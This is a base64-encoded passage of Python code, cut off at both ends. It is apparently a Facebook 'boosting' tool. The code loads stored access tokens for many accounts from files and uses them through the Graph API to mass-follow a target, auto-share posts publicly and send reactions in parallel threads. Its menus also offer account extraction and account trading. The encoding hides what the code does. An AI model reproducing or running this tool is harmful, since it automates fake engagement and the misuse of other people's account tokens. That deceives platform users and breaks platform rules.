RoKQogICAgaWYgbm90IGFjY2Vzc190b2tlbnM6CiAgICAgICAgcmV0dXJuIE5vbmUKICAgIHVzZXJfaWQgPSBpbnB1dChmJycne3llbGxvd30gIEVudGVyIHRhcmdldCBVSUQ6IHtncmVlbn0nJycpCiAgICBsaW5lKCkKICAgIHRyeToKICAgICAgICBsaW1pdCA9IGludChpbnB1dChmJycne3llbGxvd30gIElucHV0IHF1YW50aXR5IG9mIGZvbGxvd3MsIGxpbWl0IGlzIHtncmVlbn17bGVuKGFjY2Vzc190b2tlbnMpfSA6ICcnJykpCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludChmJycne3JlZH0gIEVycm9yOiBQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIgZm9yIHRoZSBsaW1pdC4nJycpCiAgICAgICAgcmV0dXJuIE5vbmUKICAgIGlmIGxpbWl0ID4gbGVuKGFjY2Vzc190b2tlbnMpOgogICAgICAgIHByaW50KGYnJyd7cmVkfSAgRXJyb3I6IFRoZSBzcGVjaWZpZWQgbGltaXQgZXhjZWVkcyB0aGUgbnVtYmVyIG9mIGF2YWlsYWJsZSBmb2xsb3dlcnMuJycnKQogICAgICAgIHJldHVybiBOb25lCiAgICBzdWNjZXNzX2NvdW50ID0gMAogICAgZmFpbHVyZV9jb3VudCA9IDAKICAgIGZvciBpLCBhY2Nlc3NfdG9rZW4gaW4gZW51bWVyYXRlKGFjY2Vzc190b2tlbnNbOmxpbWl0XSk6CiAgICAgICAgYXV0b19mb2xsb3dfdXJsID0gZicnJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxOS4wL3t1c2VyX2lkfS9zdWJzY3JpYmVycycnJwogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6IGYnJydCZWFyZXIge2FjY2Vzc190b2tlbn0nJycsCiAgICAgICAgICAgICd1c2VyLWFnZW50JzogV191ZXJhZ250KCkKICAgICAgICB9CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGF1dG9fZm9sbG93X3VybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIGlmIHJlc3BvbnNlLm9rOgogICAgICAgICAgICBzdWNjZXNzX2NvdW50ICs9IDEKICAgICAgICAgICAgcHJpbnQoZicnJ3tncmVlbn0gIEZPTExPV0VSIHtpICsgMX0gLS0tPiBTdWNjZXNzZnVsbHkgRm9sbG93ZWQhJycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGZhaWx1cmVfY291bnQgKz0gMQogICAgICAgICAgICBwcmludChmJycne3JlZH0gIEZPTExPV0VSIHtpICsgMX0gLS0tPiBGYWlsZWQgdG8gRm9sbG93IScnJykKICAgIGxpbmUoKQogICAgcHJpbnQoZicnJ3t5ZWxsb3d9ICBUT1RBTCA6IFxuJycnKQogICAgcHJpbnQoZicnJ3tncmVlbn0gIENvbXBsZXRlZCA6IHt3aGl0ZX17c3VjY2Vzc19jb3VudH0nJycpCiAgICBwcmludChmJycne3JlZH0gIEZhaWxlZCA6IHt3aGl0ZX17ZmFpbHVyZV9jb3VudH0nJycpCiAgICAKaW1wb3J0IG9zCmltcG9ydCByYW5kb20KaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IKCgpkZWYgZ2V0dG9rZXN6KGZpbGVfcGF0aCk6CiAgICAiIiJSZWFkIHRva2VucyBmcm9tIHRoZSBmaWxlIGFuZCByZXR1cm4gYSBsaXN0IG9mIHRva2Vucy4iIiIKICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICBsaW5lcyA9IGZpbGUucmVhZGxpbmVzKCkKICAgICAgICByZXR1cm4gW2xpbmUuc3RyaXAoKS5zcGxpdCgnfCcpWzFdIGZvciBsaW5lIGluIGxpbmVzIGlmICd8JyBpbiBsaW5lXQoKCmNsYXNzIGZicG9zdDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBsaW5rKToKICAgICAgICBzZWxmLmxpbmsgPSBsaW5rCgogICAgZGVmIHNoaXIoc2VsZiwgdG9rZW4pOgogICAgICAgICIiIlNoYXJlcyBhIHBvc3Qgb24gdGhlIHVzZXIncyBmZWVkIHdpdGggJ09ubHkgTWUnIHByaXZhY3kuIiIiCiAgICAgICAgdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZlZWQiCiAgICAgICAgcGF5bG9hZCA9IHsKICAgICAgICAgICAgJ2xpbmsnOiBzZWxmLmxpbmssCiAgICAgICAgICAgICdwdWJsaXNoZWQnOiAnMScsCiAgICAgICAgICAgICdwcml2YWN5JzogJ3sidmFsdWUiOiJFVkVSWU9ORSJ9JywKICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IHRva2VuCiAgICAgICAgfQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9cGF5bG9hZCkKICAgICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcHJpbnQoIlN1Y2Nlc3NmdWxseSBTaGFyZWQiKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZiJBbiBlcnJvciBvY2N1cnJlZDoge2V9IikKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCgoKZGVmIHNndHoobGluaywgZmlsZV9wYXRoLCBudW1fc2hhcmVzKToKICAgIHN0YXJ0X2FsbCA9IHRpbWUudGltZSgpCgogICAgdG9rZW5zID0gZ2V0dG9rZXN6KGZpbGVfcGF0aCkKICAgIGlmIGxlbih0b2tlbnMpIDwgbnVtX3NoYXJlczoKICAgICAgICBwcmludCgiTm90IGVub3VnaCB0b2tlbnMgdG8gbWVldCB0aGUgcmVxdWVzdGVkIG51bWJlciBvZiBzaGFyZXMuIikKICAgICAgICByZXR1cm4KCiAgICBkZWYgd29ya2VyKHRva2VuKToKICAgICAgICBmYl9wb3N0ZXIgPSBmYnBvc3QobGluaykKICAgICAgICBmYl9wb3N0ZXIuc2hpcih0b2tlbikKCiAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0yMCkgYXMgZXhlY3V0b3I6CiAgICAgICAgZm9yIHRva2VuIGluIHRva2Vuc1s6bnVtX3NoYXJlc106CiAgICAgICAgICAgIGV4ZWN1dG9yLnN1Ym1pdCh3b3JrZXIsIHRva2VuKQoKICAgIGVuZF9hbGwgPSB0aW1lLnRpbWUoKQogICAgcHJpbnQoZiJcblNoYXJpbmcgc3RhcnRlZCBhdDoge3RpbWUuY3RpbWUoc3RhcnRfYWxsKX0iKQogICAgcHJpbnQoZiJTaGFyaW5nIGVuZGVkIGF0OiB7dGltZS5jdGltZShlbmRfYWxsKX0iKQogICAgcHJpbnQoZiJUb3RhbCBkdXJhdGlvbjoge2VuZF9hbGwgLSBzdGFydF9hbGw6LjJmfSBzZWNvbmRzIikKCgpkZWYgdHRzdSgqZmlsZV9wYXRocyk6CiAgICAiIiJDb3VudCB0aGUgbnVtYmVyIG9mIGxpbmVzIGluIGVhY2ggcHJvdmlkZWQgZmlsZS4iIiIKICAgIGNvdW50cyA9IFtdCiAgICBmb3IgZmlsZV9wYXRoIGluIGZpbGVfcGF0aHM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICBjb3VudHMuYXBwZW5kKHN1bSgxIGZvciBsaW5lIGluIGZpbGUgaWYgbGluZS5zdHJpcCgpKSkKICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgIGNvdW50cy5hcHBlbmQoMCkKICAgIHJldHVybiBjb3VudHMKCgpkZWYgdHRzKCk6CiAgICAiIiJFbnN1cmUgZGlyZWN0b3JpZXMgYW5kIGZpbGVzIGV4aXN0LiIiIgogICAgZmlsZV9wYXRocyA9IFsKICAgICAgICAnL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0JywKICAgICAgICAnL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCcsCiAgICAgICAgJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCcsCiAgICAgICAgJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQnLAogICAgXQoKICAgIGZvciBmaWxlX3BhdGggaW4gZmlsZV9wYXRoczoKICAgICAgICBkaXJlY3RvcnkgPSBvcy5wYXRoLmRpcm5hbWUoZmlsZV9wYXRoKQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhkaXJlY3RvcnkpOgogICAgICAgICAgICBvcy5tYWtlZGlycyhkaXJlY3RvcnkpCiAgICAgICAgICAgIHByaW50KGYiQ3JlYXRlZCBkaXJlY3Rvcnk6IHtkaXJlY3Rvcnl9IikKCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGZpbGVfcGF0aCk6CiAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICd3JykgYXMgZmlsZToKICAgICAgICAgICAgICAgIHBhc3MgICMgQ3JlYXRlIGFuIGVtcHR5IGZpbGUKICAgICAgICAgICAgcHJpbnQoZiJDcmVhdGVkIGZpbGU6IHtmaWxlX3BhdGh9IikKCgpkZWYgcHVibGljKCk6CiAgICBwcmludCgiQ0hPT1NFIFRZUEUgT0YgQUNDT1VOVFMgVE8gQVVUTyBTSEFSRToiKQogICAgcHJpbnQoIlsxXSBGUkEgQUNDT1VOVCIpCiAgICBwcmludCgiWzJdIEZSQSBQQUdFUyIpCiAgICBwcmludCgiWzNdIFJQVyBBQ0NPVU5UIikKICAgIHByaW50KCJbNF0gUlBXIFBBR0VTIikKICAgIHByaW50KCJbMF0gRVhJVCIpCiAgICBjaG9pY2UgPSBpbnB1dCgiQ2hvaWNlOiAiKQoKICAgIGZpbGVfbWFwID0gewogICAgICAgICcxJzogJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCcsCiAgICAgICAgJzInOiAnL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCcsCiAgICAgICAgJzMnOiAnL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0JywKICAgICAgICAnNCc6ICcvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0JwogICAgfQoKICAgIGZpbGVfcGF0aCA9IGZpbGVfbWFwLmdldChjaG9pY2UpCiAgICBpZiBub3QgZmlsZV9wYXRoOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gRXhpdGluZy4iKQogICAgICAgIHJldHVybgoKICAgIGEgPSBpbnB1dCgiRW50ZXIgdGhlIHBvc3QgSUQgdG8gc2hhcmU6ICIpCiAgICBwb3N0X2lkID0gZ2V0X2NvbWJpbmVkX2RhdGEoYSkKICAgIG51bV9zaGFyZXMgPSBpbnQoaW5wdXQoIkxpbWl0OiAiKSkKICAgIGxpbmsgPSBmImh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS97cG9zdF9pZH0iCgogICAgc2d0eihsaW5rLCBmaWxlX3BhdGgsIG51bV9zaGFyZXMpCgoKZGVmIHB1YigpOgogICAgdHRzKCkKICAgIGZyYV9maWxlID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCcKICAgIGZyYV9wYWdlc19maWxlID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQnCiAgICBycHdfZmlsZSA9ICcvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQnCiAgICBycHdfcGFnZXNfZmlsZSA9ICcvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0JwoKICAgIHRvdGFsX2FjY291bnRzLCB0b3RhbF9wYWdlcywgcnB3X2FjY291bnRzLCBycHdfcGFnZXMgPSB0dHN1KAogICAgICAgIGZyYV9maWxlLCBmcmFfcGFnZXNfZmlsZSwgcnB3X2ZpbGUsIHJwd19wYWdlc19maWxlCiAgICApCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICAgICAgICAgICAgICB7aG90cGlua30gQUNDT1VOVCBPVkVSVklFV1Mge0d9IFsgQUNDT1VOVCAvIFBBR0UgXQogICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7eWVsbG93fUZSQSBBQ0NPVU5Ue3llbGxvd30gOiB7Z3JlZW59e3RvdGFsX2FjY291bnRzfQogICAgICAgICAgICAgICAgICAgICAgICAgICAge3llbGxvd31GUkEgUEFHRVMgIHt5ZWxsb3d9IDoge2dyZWVufXt0b3RhbF9wYWdlc30KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHt5ZWxsb3d9UlBXIEFDQ09VTlR7eWVsbG93fSA6IHtncmVlbn17IHJwd19hY2NvdW50c30KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHt5ZWxsb3d9UlBXIFBBR0VTICB7eWVsbG93fSA6IHtncmVlbn17cnB3X3BhZ2VzfQogICAgICB7eWVsbG93feKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG1bMG0iIiIpCiAgICBwcmludChmIiAgICAge2JsdWV9WzFdIHt5ZWxsb3d9RVhUUkFDVCBBQ0NPVU5UIikKICAgIHByaW50KGYiICAgICB7Ymx1ZX1bMl0ge3llbGxvd31BVVRPIFNIQVJFICIpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGNob2ljZSA9IGlucHV0KGYnICAgIHt5ZWxsb3d9RW50ZXIgQ2hvaWNlOiAnKQoKICAgIGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgcHVibGljKCkKCgoKCgoKIyBGdW5jdGlvbiB0byBjbGVhciBjb25zb2xlCmRlZiBjbGVhcigpOgogICAgb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdjbGVhcicpCgoKCgpkZWYgZXh0cmFjdGlvbigpOgoKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiAgICAge3doaXRlfVsxXSB7eWVsbG93fUVYVFJBQ1Qge3JlZH1BQ0NPVU5UIikKICAgIHByaW50KGYiICAgICB7d2hpdGV9WzJdIHt5ZWxsb3d9RVhUUkFDVCB7cmVkfVBBR0VTIikKICAgIHByaW50KCIgICAgIFwwMzNbMTszNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGNob2ljZSA9IGlucHV0KGYiICAgICB7Z3JlZW59Q0hPSUNFOiAiKS5zdHJpcCgpIAogICAgaWYgY2hvaWNlID09ICcxJzoKICAgICAgICBheGwxKCkKICAgIGVsaWYgY2hvaWNlID09ICcyJzoKICAgICAgICBheGwyKCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZiIgICAgIHtyZWR9SU5WQUxJRCBDSE9JQ0UiKQpkZWYgbWFpbigpOgogICAgb3BlbignL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0JywgJ2EnKS53cml0ZSgnJykKICAgIG9wZW4oJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQnLCAnYScpLndyaXRlKCcnKQogICAgb3BlbignL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0JywgJ2EnKS53cml0ZSgnJykKICAgIG9wZW4oJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCcsICdhJykud3JpdGUoJycpCiAgICBmcmFhY2NvdW50c19maWxlID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCcKICAgIGZyYXBhZ2VzX2ZpbGUgPSAnL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCcKICAgIHJwd2FjY291bnRzID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCcKICAgIHJwd3BhZ2VzID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQnCiAgICB0b3RhbF9hY2NvdW50cywgdG90YWxfcGFnZXMgPSBjb3VudF90b2tlbnMoZnJhYWNjb3VudHNfZmlsZSwgZnJhcGFnZXNfZmlsZSkKICAgIHRvdGFsX2FjY291bnRfcnB3LCB0b3RhbF9wYWdlc19ycHcgPSBjb3VudF90b2tlbnMocnB3YWNjb3VudHMscnB3cGFnZXMpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiIHtibHVlfeKUj+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUk1wwMzNbMG0iIiIpCiAgICBwcmludChmIiIiIHtibHVlfeKUgyAgICAgICAgICAgICAgICAgICAgICAgIHtob3RwaW5rfSBBQ0NPVU5UIFNUT1JBR0UgICAgICAgICAgICAgICB7Ymx1ZX0gICAgICAgICAgICAgICAgICDilIMiIiIpCiAgICBwcmludChmIiIiIHtibHVlfeKUl+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUmyAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAge2dyZWVufSBBQ0NPVU5Ue3llbGxvd30gOiB7Z3JlZW59e3RvdGFsX2FjY291bnRzfSAiIiIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICBwcmludChmIntibHVlfeKUj+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSB7Z3JlZW59QSBDIEMgTyBVIE4gVCBTIFQgTyBSIEV7Ymx1ZX0g4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSTIikKICAgIHByaW50KGYie2JsdWV94pSDICB7Z3JlZW59WzAxXSB7aG90cGlua30gU1RPUkUgQUNDT1VOVCAgICAgICAgICAgICAgICAgICAgICAgIHt5ZWxsb3d9LSB7Z3JlZW59WyDwnZCA8J2QgvCdkILwnZCO8J2QlPCdkI3wnZCTIF0gICB7Ymx1ZX0gICAgICAgICAgICAg4pSDIikKICAgIHByaW50KGYie2JsdWV94pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbICIpCiAgICBwcmludChmIntibHVlfeKUj+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSB7Z3JlZW59VCBPIE8gTCAgUyBFIFIgViBJIEMgRSBTe2JsdWV9IOKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUkyIpICAKICAgIHByaW50KGYie2JsdWV94pSDICB7Z3JlZW59WzAyXSAge2hvdHBpbmt98J2QlfCdkIDwnZCL8J2QiPCdkIPwnZCA8J2Qk/CdkIQge2dyZWVufUFDQ09VTlQgICAgICAgICAgICAgICAgICAgICB7eWVsbG93fS0ge2dyZWVufVsg8J2Qk/CdkI7wnZCK8J2QhPCdkI0gXSAgICAge2JsdWV9ICAgICAgICAgICAgIOKUgyIpCiAgICBwcmludChmIntibHVlfeKUgyAge2dyZWVufVswM10gIHtob3RwaW5rffCdkIDwnZCU8J2Qk/CdkI4ge2dyZWVuffCdkJLwnZCH8J2QgPCdkJHwnZCEIPCdkJUxICAgICAgICAgICAgICAgICAgICAgICAge3llbGxvd30tIHtncmVlbn1bIEJPVCBTSEFSRSBdIHtibHVlfSAgICAgICAgICAgICDilIMiKSAKICAgIHByaW50KGYie2JsdWV94pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbIikKICAgIHByaW50KGYie2JsdWV94pSP4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIHtncmVlbn1BIEMgQyBPIFUgTiBUICBSIEUgUyBFIFR7Ymx1ZX0g4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSTIikKICAgIHByaW50KGYie2JsdWV94pSDICB7Z3JlZW59WzA1XXtob3RwaW5rfSAg8J2QkfCdkITwnZCS8J2QhPCdkJMg8J2Qk/CdkI7wnZCO8J2Qi/CdkJIgICAgICAgICAgICAgICAgICAgICAgICAgIHt5ZWxsb3d9LSB7Z3JlZW59WyDwnZCP8J2QgPCdkIbwnZCEIPCdkI7wnZCRIPCdkIDwnZCC8J2QgvCdkI7wnZCU8J2QjfCdkJMgXSAgICAgIHtibHVlfSAg4pSDIikKICAgIHByaW50KGYie2JsdWV94pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbXDAzM1swbSIpCiAgICBjaG9pY2UgPSBpbnB1dChmIiAgICAge2dyZWVufSBDSE9JQ0Xwn5KOIDogIikuc3RyaXAoKSAgICAgICAgIAojQzpcVXNlcnNcRG9udCB0b3VjaCBteSBwY1xEZXNrdG9wXE9QRU5TT1VSQ0Vcc3kucHkKICAgIGlmIGNob2ljZSA9PSAnMSc6CiAgICAgICAgZXh0cmFjdGlvbigpCiAgICBpZiBjaG9pY2UgPT0gJzInOgogICAgICAgIGNoZWNrKCkKICAgIGlmIGNob2ljZSA9PSAnMyc6CiAgICAgICAgbWFpbjIoKQogICAgaWYgY2hvaWNlID09ICc0JzoKICAgICAgICBwdWIoKQogICAgaWYgY2hvaWNlID09ICc1JzoKICAgIAljbGVhcl90ZXh0X2ZpbGVzKCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLCBleGl0aW5nLiIpCgoKCgoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICAgICBtYWluKCkKICAgCiAgICAKICAgIAogICAgCiMgUnVuIHRoZSBmdW5jdGlvbgoKCgoKCgoKCgppbXBvcnQgcmUKCmRlZiBleHRyYWN0X2ZiaWRfZHAodXJsKToKICAgICIiIkV4dHJhY3QgRmFjZWJvb2sgSUQgZnJvbSBhIEZhY2Vib29rIHBob3RvIFVSTC4iIiIKICAgIHBhdHRlcm4gPSByJ2ZiaWQ9KFxkKyknCiAgICBtYXRjaCA9IHJlLnNlYXJjaChwYXR0ZXJuLCB1cmwpCiAgICAKICAgIGlmIG1hdGNoOgogICAgICAgIHJldHVybiBtYXRjaC5ncm91cCgxKSAgIyBSZXR1cm4gdGhlIGNhcHR1cmVkIGdyb3VwCiAgICByZXR1cm4gTm9uZSAgIyBSZXR1cm4gTm9uZSBpZiBubyBtYXRjaCBpcyBmb3VuZAoKCmltcG9ydCByZXF1ZXN0cwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yLCBhc19jb21wbGV0ZWQKCmRlZiBwZXJmb3JtX3JlYWN0aW9uKHRva2VuLCB1aWRfdXJsLCByZWFjdGlvbl90eXBlKToKICAgICIiIlNlbmQgYSByZWFjdGlvbiB1c2luZyB0aGUgcHJvdmlkZWQgYWNjZXNzIHRva2VuLiIiIgogICAgYWNjZXNzX3Rva2VuID0gdG9rZW4uc3BsaXQoJ3wnKVsxXSAgIyBBc3N1bWluZyBmb3JtYXQgaXMgZW1haWx8YWNjZXNzX3Rva2VuCiAgICBhdXRvX3JlYWN0ID0gZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97dWlkX3VybH0vcmVhY3Rpb25zP3R5cGU9e3JlYWN0aW9uX3R5cGV9JmFjY2Vzc190b2tlbj17YWNjZXNzX3Rva2VufScKICAgIAogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChhdXRvX3JlYWN0KQogICAgICAgIHJldHVybiBhY2Nlc3NfdG9rZW4sIHJlc3BvbnNlLnN0YXR1c19jb2RlLCByZXNwb25zZS50ZXh0ICAjIFJldHVybiB0aGUgcmVzdWx0cyBmb3IgZnVydGhlciBwcm9jZXNzaW5nCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIGFjY2Vzc190b2tlbiwgTm9uZSwgc3RyKGUpICAjIEhhbmRsZSByZXF1ZXN0IGV4Y2VwdGlvbnMKCmRlZiBwZXJmb3JtX3JlYWN0aW9uX2Zhc3RfZHAoKToKICAgICIiIlBlcmZvcm0gcmVhY3Rpb25zIGJhc2VkIG9uIHVzZXIgaW5wdXQgZm9yIGZpbGUgY2hvaWNlLCBzdGFydGluZyBsaW5lLCBwb3N0IGxpbmssIHJlYWN0aW9uIHR5cGUsIGFuZCBudW1iZXIgb2YgcmVhY3Rpb25zLiIiIgogICAgICAgCiAgICAjIFN0ZXAgMTogQXNrIHRoZSB1c2VyIHdoaWNoIGZ